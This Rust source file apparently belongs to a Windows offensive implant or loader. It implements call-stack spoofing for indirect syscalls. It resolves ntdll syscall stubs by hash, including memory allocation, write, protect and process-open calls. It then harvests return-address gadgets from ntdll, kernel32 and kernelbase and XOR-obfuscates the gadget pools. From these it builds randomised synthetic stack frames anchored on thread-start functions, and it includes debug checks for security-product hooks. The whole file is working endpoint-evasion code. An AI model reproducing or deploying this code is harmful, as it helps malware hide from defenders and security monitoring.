#![allow(non_snake_case)]

use core::sync::atomic::{AtomicU64, AtomicU32, AtomicUsize, Ordering};

#[repr(C)]
#[derive(Clone, Copy)]
#[allow(dead_code)]
pub(crate) struct SyntheticFrame {
    pub saved_rbp: u64,
    pub return_addr: u64,
}

const MAX_GADGETS: usize = 32;

static KERNEL32_GADGETS: [AtomicU64; MAX_GADGETS] = [const { AtomicU64::new(0) }; MAX_GADGETS];

static NTDLL_GADGETS: [AtomicU64; MAX_GADGETS] = [const { AtomicU64::new(0) }; MAX_GADGETS];

static NTDLL_RETURN_GADGETS: [AtomicU64; MAX_GADGETS] =
    [const { AtomicU64::new(0) }; MAX_GADGETS];

static KERNELBASE_GADGETS: [AtomicU64; MAX_GADGETS] = [const { AtomicU64::new(0) }; MAX_GADGETS];

static NTDLL_RETURN_SIZES: [AtomicU32; MAX_GADGETS] = [const { AtomicU32::new(0) }; MAX_GADGETS];
static KERNEL32_SIZES: [AtomicU32; MAX_GADGETS] = [const { AtomicU32::new(0) }; MAX_GADGETS];
static KERNELBASE_SIZES: [AtomicU32; MAX_GADGETS] = [const { AtomicU32::new(0) }; MAX_GADGETS];

static KERNEL32_GADGET_COUNT: AtomicUsize = AtomicUsize::new(0);

static NTDLL_GADGET_COUNT: AtomicUsize = AtomicUsize::new(0);

static NTDLL_RETURN_COUNT: AtomicUsize = AtomicUsize::new(0);

static KERNELBASE_GADGET_COUNT: AtomicUsize = AtomicUsize::new(0);

static GADGETS_INITIALIZED: AtomicU64 = AtomicU64::new(0);

static RNG_STATE: AtomicU64 = AtomicU64::new(0);

static ANCHOR_BASE_THREAD_INIT: AtomicU64 = AtomicU64::new(0);
static ANCHOR_RTL_USER_THREAD_START: AtomicU64 = AtomicU64::new(0);

static POOL_XOR_KEY: AtomicU64 = AtomicU64::new(0);

#[inline(always)]
pub(crate) fn pool_key() -> u64 {
    let k = POOL_XOR_KEY.load(Ordering::Relaxed);
    if k != 0 { return k; }

    let tsc: u64;
    unsafe {
        core::arch::asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") tsc,
            out("rdx") _,
            options(nostack, nomem, preserves_flags)
        );
    }

    let key = tsc | 0x8000_0000_0000_0001;
    POOL_XOR_KEY.store(key, Ordering::Release);
    key
}

#[inline(always)]
pub(crate) fn pool_store(slot: &AtomicU64, addr: u64) {
    slot.store(addr ^ pool_key(), Ordering::Release);
}

#[inline(always)]
pub(crate) fn pool_load(slot: &AtomicU64) -> u64 {
    let v = slot.load(Ordering::Acquire);
    if v == 0 { return 0; }
    v ^ pool_key()
}

fn seed_rng() {
    let tsc: u64;
    unsafe {
        core::arch::asm!(
            "rdtsc",
            "shl rdx, 32",
            "or rax, rdx",
            out("rax") tsc,
            out("rdx") _,
            options(nostack, nomem, preserves_flags)
        );
    }

    if !crate::config::advanced_behavior_randomization() {
        RNG_STATE.store(0xDEADBEEFCAFEBABE, Ordering::Release);
        return;
    }

    let seed = if tsc == 0 {
        include!(concat!(env!("OUT_DIR"), "/stack_spoof_seed.in"))
    } else {
        tsc
    };
    RNG_STATE.store(seed, Ordering::Release);
}

#[inline]
fn xorshift64() -> u64 {
    let mut x = RNG_STATE.load(Ordering::Relaxed);
    if x == 0 {
        seed_rng();
        x = RNG_STATE.load(Ordering::Relaxed);
    }

    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;

    RNG_STATE.store(x, Ordering::Release);
    x
}

#[inline]
pub(crate) fn random_index(max: usize) -> usize {
    if !crate::config::advanced_behavior_randomization() {
        if max == 0 { return 0; }
        return 0; 
    }

    if max == 0 {
        return 0;
    }
    (xorshift64() as usize) % max
}

unsafe fn collect_gadgets_from_stubs(
    gadget_pool: &[AtomicU64; MAX_GADGETS],
) -> usize {
    use crate::hash::fnv1a_hash;

    const STUB_HASHES: [u64; 24] = [
        fnv1a_hash(b"NtClose"),
        fnv1a_hash(b"NtWaitForSingleObject"),
        fnv1a_hash(b"NtAllocateVirtualMemory"),
        fnv1a_hash(b"NtWriteVirtualMemory"),
        fnv1a_hash(b"NtFreeVirtualMemory"),
        fnv1a_hash(b"NtQueryVirtualMemory"),
        fnv1a_hash(b"NtProtectVirtualMemory"),
        fnv1a_hash(b"NtDelayExecution"),
        fnv1a_hash(b"NtCreateSection"),
        fnv1a_hash(b"NtMapViewOfSection"),
        fnv1a_hash(b"NtUnmapViewOfSection"),
        fnv1a_hash(b"NtCreateTimer"),
        fnv1a_hash(b"NtSetTimer"),
        fnv1a_hash(b"NtFlushInstructionCache"),
        fnv1a_hash(b"NtCreateFile"),
        fnv1a_hash(b"NtReadFile"),
        fnv1a_hash(b"NtWriteFile"),
        fnv1a_hash(b"NtOpenFile"),
        fnv1a_hash(b"NtOpenProcess"),
        fnv1a_hash(b"NtQueryInformationProcess"),
        fnv1a_hash(b"NtCreateEvent"),
        fnv1a_hash(b"NtSetEvent"),
        fnv1a_hash(b"NtDuplicateObject"),
        fnv1a_hash(b"NtQuerySystemInformation"),
    ];

    let mut count = 0;

    for &hash in &STUB_HASHES {
        if count >= MAX_GADGETS {
            break;
        }

        if let Some((_ssn, stub)) = crate::ssn_resolver::resolve_ssn_by_hash(hash) {

            if let Some(gadget_addr) = crate::syscalls::find_stub_gadget(stub) {

                let mut duplicate = false;
                for i in 0..count {
                    if pool_load(&gadget_pool[i]) == gadget_addr {
                        duplicate = true;
                        break;
                    }
                }
                if !duplicate {
                    pool_store(&gadget_pool[count], gadget_addr);
                    count += 1;
                }
            }
        }
    }

    crate::debug_log!(
        "[SCAN] Stub-based gadget collection: {} unique gadgets from {} APIs",
        count, STUB_HASHES.len()
    );
    count
}

pub(crate) unsafe fn find_call_site_return_addresses(
    module_base: *const u8,
    output_pool: &[AtomicU64; MAX_GADGETS],
    output_sizes: &[AtomicU32; MAX_GADGETS],
) -> usize {
    if module_base.is_null() {
        return 0;
    }

    let (text_start, text_size) = match crate::pe::find_text_section(module_base) {
        Some(t) => t,
        None => return 0,
    };

    let pdata_info = unsafe { crate::pe::find_pdata_entries(module_base) };

    let module_end =
        module_base as usize + crate::pe::get_module_size(module_base as _).unwrap_or(0) as usize;

    const NUM_WINDOWS: usize = 4;
    const WINDOW_SIZE: usize = 0x2000;
    let usable_text = text_size.saturating_sub(0x2000);

    let mut count = 0;
    #[allow(unused_variables, unused_assignments)]
    let mut pdata_rejected = 0usize;
    #[allow(unused_variables, unused_assignments)]
    let mut unwind_skipped = 0usize;

    let mut secondary_addrs: [u64; MAX_GADGETS] = [0u64; MAX_GADGETS];
    let mut secondary_sizes: [u32; MAX_GADGETS] = [0u32; MAX_GADGETS];
    let mut secondary_count: usize = 0;

    for win_idx in 0..NUM_WINDOWS {
        if count >= MAX_GADGETS {
            break;
        }

        let quarter_size = usable_text / NUM_WINDOWS;
        let quarter_start = quarter_size * win_idx;
        let random_offset = if quarter_size > 0x200 {
            random_index(quarter_size.saturating_sub(WINDOW_SIZE))
        } else {
            0
        };

        let scan_start = text_start as usize + 0x1000 + quarter_start + random_offset;
        let scan_end = (scan_start + WINDOW_SIZE).min(
            (text_start as usize + text_size).saturating_sub(10),
        );

        let per_window_limit = (MAX_GADGETS - count).min(MAX_GADGETS / NUM_WINDOWS + 2);

        #[cfg(debug_assertions)]
        if win_idx == 0 {
            crate::debug_log!(
                "[SCAN] RetAddr scan: base=0x{:X}, {}x{}KB windows across 0x{:X} .text",
                module_base as usize,
                NUM_WINDOWS,
                WINDOW_SIZE / 1024,
                text_size
            );
        }

        let mut window_count = 0;
        let mut addr = scan_start;

        while addr < scan_end && count < MAX_GADGETS && window_count < per_window_limit {
            let b0 = *(addr as *const u8);

            if b0 == 0xE8 {
                let prefix_valid = if addr > text_start as usize + 1 {
                    let b_minus1 = *((addr - 1) as *const u8);
                    let b_minus2 = *((addr - 2) as *const u8);

                    let is_valid_prefix = matches!(b_minus1,
                        0xC3 |
                        0x90 |
                        0x48 | 0x4C | 0x49 | 0x41 | 0x44 | 0x45 |
                        0x8B | 0x89 | 0x8D |
                        0x31 | 0x33 | 0x2B | 0x83 |
                        0x50..=0x57 |
                        0xEB |
                        0x74..=0x7F |
                        0xC2 | 0xCC | 0xCB | 0xCA
                    );

                    let not_mid_instruction = !((b_minus2 == 0x48 || b_minus2 == 0x4C)
                        && (b_minus1 == 0xE8 || b_minus1 == 0xE9));

                    is_valid_prefix && not_mid_instruction
                } else {
                    false
                };

                if !prefix_valid {
                    addr += 1;
                    continue;
                }

                let rel_offset = core::ptr::read_unaligned((addr + 1) as *const i32);
                let call_target = (addr as i64 + 5 + rel_offset as i64) as usize;

                if call_target < module_base as usize || call_target >= module_end {
                    addr += 1;
                    continue;
                }

                if call_target < text_start as usize
                    || call_target >= (text_start as usize + text_size)
                {
                    addr += 1;
                    continue;
                }

                let return_addr = (addr + 5) as u64;
                let post_call_byte = *((addr + 5) as *const u8);

                let is_valid_post_call = matches!(
                    post_call_byte,
                    0x48 | 0x4C | 0x49 | 0x41 | 0x44 | 0x45 |
                    0x8B | 0x89 | 0x8D |
                    0x85 |
                    0x83 |
                    0x31 | 0x33 |
                    0x50..=0x57 |
                    0x90
                );

                    if is_valid_post_call {

                    if let Some((pd, pd_count)) = pdata_info {
                        let rva =
                            (return_addr as usize).wrapping_sub(module_base as usize) as u32;
                        match unsafe { crate::pe::lookup_function_entry(pd, pd_count, rva) } {
                            None => {
                                #[allow(unused_assignments)]
                                { pdata_rejected += 1; }
                                addr += 1;
                                continue;
                            }
                            Some(rf) => {
                                if !unsafe { crate::pe::function_has_frame_register(module_base, rf) } {

                                    if secondary_count < MAX_GADGETS {
                                        secondary_addrs[secondary_count] = return_addr;

                                        secondary_sizes[secondary_count] = unsafe {
                                            crate::pe::calculate_frame_allocation(module_base, rf)
                                        };
                                        secondary_count += 1;
                                    }
                                    #[allow(unused_assignments)]
                                    { unwind_skipped += 1; }
                                    addr += 1;
                                    continue;
                                }
                            }
                        }
                    }

                    pool_store(&output_pool[count], return_addr);

                    if let Some((pd, pd_count)) = pdata_info {
                        let rva = (return_addr as usize).wrapping_sub(module_base as usize) as u32;
                        if let Some(rf) = unsafe { crate::pe::lookup_function_entry(pd, pd_count, rva) } {
                            let fsize = unsafe { crate::pe::calculate_frame_allocation(module_base, rf) };
                            output_sizes[count].store(fsize, Ordering::Release);
                        } else {
                            output_sizes[count].store(0x28, Ordering::Release);
                        }
                    } else {
                        output_sizes[count].store(0x28, Ordering::Release);
                    }
                    count += 1;
                    window_count += 1;

                    addr += 48;
                    continue;
                }
            }

            addr += 1;
        }
    }

    if count == 0 && secondary_count > 0 {
        let use_count = secondary_count.min(MAX_GADGETS);
        for i in 0..use_count {
            pool_store(&output_pool[i], secondary_addrs[i]);
            output_sizes[i].store(secondary_sizes[i], Ordering::Release);
        }
        count = use_count;
        crate::debug_log!(
            "[SCAN] Frame-register relaxed: {} .pdata-validated non-framereg addresses promoted",
            count
        );
    }

    crate::debug_log!(
        "[SCAN] RetAddr result: {} accepted, {} pdata-rejected, {} unwind-skipped(no-framereg), {} secondary-available",
        count,
        pdata_rejected,
        unwind_skipped,
        secondary_count
    );

    count
}

unsafe fn find_call_return_in_function(func: *const u8, scan_len: usize) -> u64 {
    let skip = 0x08;

    for offset in skip..scan_len.saturating_sub(2) {
        let b0 = *func.add(offset);
        let b1 = *func.add(offset + 1);

        if b0 == 0xFF && (0xD0..=0xD7).contains(&b1) {
            return func.add(offset + 2) as u64;
        }

        if b0 == 0x41 && b1 == 0xFF && offset + 2 < scan_len {
            let b2 = *func.add(offset + 2);
            if (0xD0..=0xD7).contains(&b2) {
                return func.add(offset + 3) as u64;
            }
        }
    }

    for offset in 0x10..scan_len.saturating_sub(5) {
        if *func.add(offset) == 0xE8 {
            return func.add(offset + 5) as u64;
        }
    }

    for offset in skip..scan_len.saturating_sub(6) {
        let b0 = *func.add(offset);
        let b1 = *func.add(offset + 1);
        if b0 == 0xFF && b1 == 0x15 {
            return func.add(offset + 6) as u64;
        }
    }

    0
}

unsafe fn resolve_anchor_frames() {
    use crate::hash::{
        get_export_by_hash, get_module_by_hash, H_BASE_THREAD_INIT_THUNK, H_KERNEL32, H_NTDLL,
        H_RTL_USER_THREAD_START,
    };

    if let Some(k32) = get_module_by_hash(H_KERNEL32) {
        if let Some(func) = get_export_by_hash(k32, H_BASE_THREAD_INIT_THUNK) {
            let ret_addr = find_call_return_in_function(func as *const u8, 64);
            if ret_addr != 0 {
                pool_store(&ANCHOR_BASE_THREAD_INIT, ret_addr);
                crate::debug_log!("[ANCHOR] BaseThreadInitThunk ret: 0x{:X}", ret_addr);
            } else {
                crate::debug_log!("[ANCHOR] BaseThreadInitThunk CALL not found");
            }
        }
    }

    if let Some(ntdll) = get_module_by_hash(H_NTDLL) {
        if let Some(func) = get_export_by_hash(ntdll, H_RTL_USER_THREAD_START) {
            let ret_addr = find_call_return_in_function(func as *const u8, 64);
            if ret_addr != 0 {
                pool_store(&ANCHOR_RTL_USER_THREAD_START, ret_addr);
                crate::debug_log!("[ANCHOR] RtlUserThreadStart ret: 0x{:X}", ret_addr);
            } else {
                crate::debug_log!("[ANCHOR] RtlUserThreadStart CALL not found");
            }
        }
    }
}

pub(crate) unsafe fn init_gadget_pools() -> bool {
    if GADGETS_INITIALIZED.load(Ordering::Acquire) != 0 {
        return true;
    }

    seed_rng();

    crate::debug_log!("[SPOOF] Initializing gadget pools");

    let ntdll = match crate::hash::get_module_by_hash(crate::hash::H_NTDLL) {
        Some(m) => m as *const u8,
        None => {
            crate::debug_log!("[SPOOF] Ntdll not found");
            return false;
        }
    };

    let kernel32 = crate::hash::get_module_by_hash(crate::hash::H_KERNEL32).map(|m| m as *const u8);

    let kernelbase =
        crate::hash::get_module_by_hash(crate::hash::H_KERNELBASE).map(|m| m as *const u8);

    let ntdll_syscall_count = collect_gadgets_from_stubs(&NTDLL_GADGETS);
    NTDLL_GADGET_COUNT.store(ntdll_syscall_count, Ordering::Release);
    crate::debug_log!("[SPOOF] Ntdll syscall gadgets: {}", ntdll_syscall_count);

    let ntdll_ret_count = find_call_site_return_addresses(ntdll, &NTDLL_RETURN_GADGETS, &NTDLL_RETURN_SIZES);
    NTDLL_RETURN_COUNT.store(ntdll_ret_count, Ordering::Release);
    crate::debug_log!("[SPOOF] Ntdll return addresses: {}", ntdll_ret_count);

    let k32_count = if let Some(k32) = kernel32 {
        let count = find_call_site_return_addresses(k32, &KERNEL32_GADGETS, &KERNEL32_SIZES);
        KERNEL32_GADGET_COUNT.store(count, Ordering::Release);
        crate::debug_log!("[SPOOF] Kernel32 return addresses: {}", count);
        count
    } else {
        crate::debug_log!("[SPOOF] Kernel32 not found; using fallbacks");
        0
    };

    if let Some(kb) = kernelbase {
        let kb_count = find_call_site_return_addresses(kb, &KERNELBASE_GADGETS, &KERNELBASE_SIZES);
        KERNELBASE_GADGET_COUNT.store(kb_count, Ordering::Release);
        crate::debug_log!("[SPOOF] KernelBase return addresses: {}", kb_count);
    }

    resolve_anchor_frames();

    let has_return_addrs =
        k32_count > 0 || KERNELBASE_GADGET_COUNT.load(Ordering::Acquire) > 0 || ntdll_ret_count > 0;

    if ntdll_syscall_count > 0 && has_return_addrs {
        GADGETS_INITIALIZED.store(1, Ordering::Release);
        crate::debug_log!("[SPOOF] Gadget pools initialized");
        true
    } else {
        crate::debug_log!(
            "[SPOOF] Initialization failed (syscall: {}, return: {})",
            ntdll_syscall_count,
            has_return_addrs
        );
        false
    }
}

pub(crate) fn get_random_syscall_gadget() -> u64 {
    let count = NTDLL_GADGET_COUNT.load(Ordering::Acquire);
    if count == 0 {
        return 0;
    }

    let idx = random_index(count);
    pool_load(&NTDLL_GADGETS[idx])
}

const MAX_CHAIN_DEPTH: usize = 8;

#[repr(C)]
#[derive(Clone, Copy)]
pub(crate) struct SyntheticChain {

    pub return_addrs: [u64; MAX_CHAIN_DEPTH],

    pub frame_sizes: [u32; MAX_CHAIN_DEPTH],

    pub depth: usize,

    pub context_bases: [u64; 4],

    pub context_seed: u64,
}

impl Default for SyntheticChain {
    fn default() -> Self {
        Self {
            return_addrs: [0u64; MAX_CHAIN_DEPTH],
            frame_sizes: [0x28u32; MAX_CHAIN_DEPTH],
            depth: 0,
            context_bases: [0u64; 4],
            context_seed: 0,
        }
    }
}

pub(crate) fn build_spoof_chain() -> SyntheticChain {
    let k32_count = KERNEL32_GADGET_COUNT.load(Ordering::Acquire);
    let kb_count = KERNELBASE_GADGET_COUNT.load(Ordering::Acquire);
    let ntdll_count = NTDLL_RETURN_COUNT.load(Ordering::Acquire);

    if k32_count == 0 && ntdll_count == 0 && kb_count == 0 {
        return SyntheticChain::default();
    }

    let anchor_bti = pool_load(&ANCHOR_BASE_THREAD_INIT);
    let anchor_ruts = pool_load(&ANCHOR_RTL_USER_THREAD_START);
    let has_anchors = anchor_bti != 0 && anchor_ruts != 0;

    let api_depth = 4 + random_index(2);
    let depth = if has_anchors {
        (api_depth + 2).min(MAX_CHAIN_DEPTH)
    } else {
        api_depth.min(MAX_CHAIN_DEPTH)
    };

    let mut chain = SyntheticChain::default();
    let mut fi: usize = 0;

    unsafe {

        if let Some((start, end)) = crate::pe::get_ntdll_text_bounds() {
            let text_size = end - start;

            let safe_offset = if text_size > 0x10_0000 { 0 } else { text_size / 4 };
            chain.context_bases[0] = (start + safe_offset) as u64;
        }

        if let Some(k32) = crate::hash::get_module_by_hash(crate::hash::H_KERNEL32) {
            if let Some((start, size)) = crate::pe::find_text_section(k32 as *const u8) {
                let safe_offset = if size > 0x10_0000 { 0 } else { size / 4 };
                chain.context_bases[1] = (start as usize + safe_offset) as u64;
            }
        }

        let rsp_approx: u64;
        core::arch::asm!("mov {}, rsp", out(reg) rsp_approx, options(nostack, nomem, preserves_flags));
        chain.context_bases[2] = rsp_approx & 0xFFFF_FFFF_FFFF_0000;

        let tsc: u64;
        core::arch::asm!(
            "rdtsc", "shl rdx, 32", "or rax, rdx",
            out("rax") tsc, out("rdx") _,
            options(nostack, nomem, preserves_flags)
        );
        chain.context_seed = tsc | 1;
    }

    let terminal_start = if has_anchors { depth - 2 } else { depth };

    #[inline(always)]
    fn pick_from_pool(
        pool: &[AtomicU64; MAX_GADGETS],
        sizes: &[AtomicU32; MAX_GADGETS],
        pool_count: usize,
    ) -> (u64, u32) {
        let idx = random_index(pool_count);
        let addr = pool_load(&pool[idx]);
        let fsize = sizes[idx].load(Ordering::Acquire);

        let fsize = if fsize < 0x28 || fsize > 0xB0 { 0x40 } else { fsize };
        (addr, fsize)
    }

    const FRAME_BUFFER_SIZE: u32 = 0x300;
    let anchor_cost: u32 = if has_anchors { 0x28 + 0x48 } else { 0 };
    let api_budget: u32 = FRAME_BUFFER_SIZE.saturating_sub(anchor_cost + 0x10);
    let mut cumulative: u32 = 0;

    #[inline(always)]
    fn budget_insert(
        chain: &mut SyntheticChain,
        fi: &mut usize,
        addr: u64,
        mut fsize: u32,
        cumulative: &mut u32,
        api_budget: u32,
        remaining_frames: u32,
    ) -> bool {
        if addr == 0 { return false; }

        let remaining = api_budget.saturating_sub(*cumulative);
        let fair_share = if remaining_frames > 0 {
            remaining / remaining_frames
        } else {
            0x40
        };

        let dynamic_max = fair_share.max(0x28).min(0xB0);
        if fsize > dynamic_max {
            fsize = dynamic_max;
        }

        chain.return_addrs[*fi] = addr;
        chain.frame_sizes[*fi] = fsize;
        *cumulative += fsize;
        *fi += 1;
        true
    }

    if fi < terminal_start && ntdll_count > 0 {
        let (addr, fsize) = pick_from_pool(&NTDLL_RETURN_GADGETS, &NTDLL_RETURN_SIZES, ntdll_count);
        let rem = (terminal_start - fi) as u32;
        budget_insert(&mut chain, &mut fi, addr, fsize, &mut cumulative, api_budget, rem);
    }

    if fi < terminal_start && kb_count > 0 {
        let (addr, fsize) = pick_from_pool(&KERNELBASE_GADGETS, &KERNELBASE_SIZES, kb_count);
        let rem = (terminal_start - fi) as u32;
        budget_insert(&mut chain, &mut fi, addr, fsize, &mut cumulative, api_budget, rem);
    }

    if fi < terminal_start && k32_count > 0 {
        let (addr, fsize) = pick_from_pool(&KERNEL32_GADGETS, &KERNEL32_SIZES, k32_count);
        let rem = (terminal_start - fi) as u32;
        budget_insert(&mut chain, &mut fi, addr, fsize, &mut cumulative, api_budget, rem);
    }

    let mut last_module: u8 = 0xFF;
    let mut consec_count: u8 = 0;

    while fi < terminal_start {
        let rem = (terminal_start - fi) as u32;
        if rem == 0 { break; }

        let roll = random_index(20) as u8;

        let force_switch = consec_count >= 2;

        let preferred: u8 = if roll < 12 { 0 }
                            else if roll < 17 { 1 }
                            else { 2 };

        let target = if force_switch && preferred == last_module {
            (preferred + 1) % 3
        } else {
            preferred
        };

        let order: [u8; 3] = match target {
            0 => [0, 1, 2],
            1 => [1, 0, 2],
            _ => [2, 0, 1],
        };

        let mut result: Option<(u64, u32, u8)> = None;
        for &m in order.iter() {
            if result.is_some() { break; }
            let (a, f) = match m {
                0 if ntdll_count > 0 => pick_from_pool(&NTDLL_RETURN_GADGETS, &NTDLL_RETURN_SIZES, ntdll_count),
                1 if kb_count > 0    => pick_from_pool(&KERNELBASE_GADGETS, &KERNELBASE_SIZES, kb_count),
                2 if k32_count > 0   => pick_from_pool(&KERNEL32_GADGETS, &KERNEL32_SIZES, k32_count),
                _ => continue,
            };
            if a != 0 { result = Some((a, f, m)); }
        }

        match result {
            Some((addr, fsize, module_id)) => {
                if budget_insert(&mut chain, &mut fi, addr, fsize,
                                 &mut cumulative, api_budget, rem) {
                    if module_id == last_module {
                        consec_count += 1;
                    } else {
                        last_module = module_id;
                        consec_count = 1;
                    }
                } else { break; }
            }
            None => break,
        }
    }

    if has_anchors {
        if fi < depth {
            chain.return_addrs[fi] = anchor_bti;
            chain.frame_sizes[fi] = 0x28;
            fi += 1;
        }
        if fi < depth {
            chain.return_addrs[fi] = anchor_ruts;
            chain.frame_sizes[fi] = 0x48;
            fi += 1;
        }
    }

    chain.depth = fi;

    unsafe {
        let ntdll_bounds = crate::pe::get_ntdll_text_bounds();
        let k32_bounds = crate::hash::get_module_by_hash(crate::hash::H_KERNEL32)
            .and_then(|m| {
                let base = m as *const u8;
                crate::pe::find_text_section(base)
                    .map(|(start, size)| (start as usize, start as usize + size))
            });
        let kb_bounds = crate::hash::get_module_by_hash(crate::hash::H_KERNELBASE)
            .and_then(|m| {
                let base = m as *const u8;
                crate::pe::find_text_section(base)
                    .map(|(start, size)| (start as usize, start as usize + size))
            });

        let api_end = if has_anchors && chain.depth >= 2 {
            chain.depth - 2
        } else {
            chain.depth
        };

        for i in 0..api_end {
            let addr = chain.return_addrs[i] as usize;
            if addr == 0 { continue; }

            let in_ntdll = ntdll_bounds
                .map(|(s, e)| addr >= s && addr < e)
                .unwrap_or(false);
            let in_k32 = k32_bounds
                .map(|(s, e)| addr >= s && addr < e)
                .unwrap_or(false);
            let in_kb = kb_bounds
                .map(|(s, e)| addr >= s && addr < e)
                .unwrap_or(false);

            if !in_ntdll && !in_k32 && !in_kb {
                crate::debug_log!(
                    "[SPOOF] Chain frame {} (0x{:X}) outside known .text  invalidated",
                    i, addr
                );
                chain.return_addrs[i] = 0;
            }
        }

        let mut write_idx = 0usize;
        for read_idx in 0..chain.depth {
            if chain.return_addrs[read_idx] != 0 {
                if write_idx != read_idx {
                    chain.return_addrs[write_idx] = chain.return_addrs[read_idx];
                    chain.frame_sizes[write_idx] = chain.frame_sizes[read_idx];
                }
                write_idx += 1;
            }
        }
        chain.depth = write_idx;
    }

    crate::debug_log!(
        "[SPOOF] Chain: depth={}, anchors={}",
        chain.depth,
        has_anchors
    );
    #[cfg(debug_assertions)]
    for i in 0..chain.depth {
        let addr = chain.return_addrs[i];
        let fs = chain.frame_sizes[i];
        crate::debug_log!("[SPOOF]   Frame {}: 0x{:X} (size=0x{:X})", i, addr, fs);
    }

    chain
}

#[inline]
pub(crate) fn build_zero_depth_chain() -> SyntheticChain {
    use core::cell::UnsafeCell;

    thread_local! {
        static CACHED_CHAIN: UnsafeCell<(SyntheticChain, u32)> =
            UnsafeCell::new((SyntheticChain::default(), 0));
    }

    CACHED_CHAIN.with(|cell| {
        let (chain, counter) = unsafe { &mut *cell.get() };

        if chain.depth == 0 || (*counter & 0x0F) == 0 {
            *chain = build_spoof_chain();
            *counter = 1;
        } else {
            *counter = counter.wrapping_add(1);
        }

        *chain
    })
}

#[inline]
pub(crate) fn is_initialized() -> bool {
    GADGETS_INITIALIZED.load(Ordering::Acquire) != 0
}

#[inline]
pub(crate) fn syscall_gadget_count() -> usize {
    NTDLL_GADGET_COUNT.load(Ordering::Acquire)
}

#[inline]
pub(crate) fn return_address_count() -> usize {

    KERNEL32_GADGET_COUNT.load(Ordering::Acquire)
        + NTDLL_RETURN_COUNT.load(Ordering::Acquire)
        + KERNELBASE_GADGET_COUNT.load(Ordering::Acquire)
}

#[cfg(debug_assertions)]
#[derive(Clone, Copy, PartialEq)]
#[derive(Debug)]
pub(crate) enum HookType {
    JmpRel32,
    CallRel32,
    PushRet,
    MovJmpRax,
    SyscallPrologueHook,
    Clean,
}

#[cfg(debug_assertions)]
#[derive(Clone, Copy, Debug)]
pub(crate) struct HookInfo {
    pub hook_type: HookType,
    pub target_address: u64,
    #[allow(dead_code)]
    pub hook_size: usize,
}

#[cfg(debug_assertions)]
pub(crate) unsafe fn detect_hook_at_address(addr: usize) -> HookInfo {
    if addr == 0 {
        return HookInfo {
            hook_type: HookType::Clean,
            target_address: 0,
            hook_size: 0,
        };
    }

    let b: [u8; 12] = [
        *(addr as *const u8),
        *((addr + 1) as *const u8),
        *((addr + 2) as *const u8),
        *((addr + 3) as *const u8),
        *((addr + 4) as *const u8),
        *((addr + 5) as *const u8),
        *((addr + 6) as *const u8),
        *((addr + 7) as *const u8),
        *((addr + 8) as *const u8),
        *((addr + 9) as *const u8),
        *((addr + 10) as *const u8),
        *((addr + 11) as *const u8),
    ];

    if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xE9 {
        let rel_offset = i32::from_le_bytes([b[4], b[5], b[6], b[7]]);
        let target = (addr as i64 + 8 + rel_offset as i64) as u64;
        return HookInfo {
            hook_type: HookType::SyscallPrologueHook,
            target_address: target,
            hook_size: 8,
        };
    }

    if b[0] == 0xE9 {
        let rel_offset = i32::from_le_bytes([b[1], b[2], b[3], b[4]]);
        let target = (addr as i64 + 5 + rel_offset as i64) as u64;
        return HookInfo {
            hook_type: HookType::JmpRel32,
            target_address: target,
            hook_size: 5,
        };
    }

    if b[0] == 0xE8 {
        let rel_offset = i32::from_le_bytes([b[1], b[2], b[3], b[4]]);
        let target = (addr as i64 + 5 + rel_offset as i64) as u64;
        return HookInfo {
            hook_type: HookType::CallRel32,
            target_address: target,
            hook_size: 5,
        };
    }

    if b[0] == 0x68 && b[5] == 0xC3 {
        let target = u32::from_le_bytes([b[1], b[2], b[3], b[4]]) as u64;
        return HookInfo {
            hook_type: HookType::PushRet,
            target_address: target,
            hook_size: 6,
        };
    }

    if b[0] == 0x48 && b[1] == 0xB8 && b[10] == 0xFF && b[11] == 0xE0 {
        let target = u64::from_le_bytes([b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9]]);
        return HookInfo {
            hook_type: HookType::MovJmpRax,
            target_address: target,
            hook_size: 12,
        };
    }

    HookInfo {
        hook_type: HookType::Clean,
        target_address: 0,
        hook_size: 0,
    }
}

#[cfg(debug_assertions)]
#[inline]
pub(crate) unsafe fn is_syscall_hooked(stub_addr: usize) -> bool {
    let info = detect_hook_at_address(stub_addr);
    info.hook_type != HookType::Clean
}

pub(crate) fn verify_gadgets_integrity() -> bool {
    let syscalls = syscall_gadget_count();
    let returns = return_address_count();

    if syscalls == 0 || returns == 0 {
        crate::debug_log!(
            "[SPOOF] Gadget pool incomplete (sys: {}, ret: {})",
            syscalls,
            returns
        );
        return false;
    }
    true
}

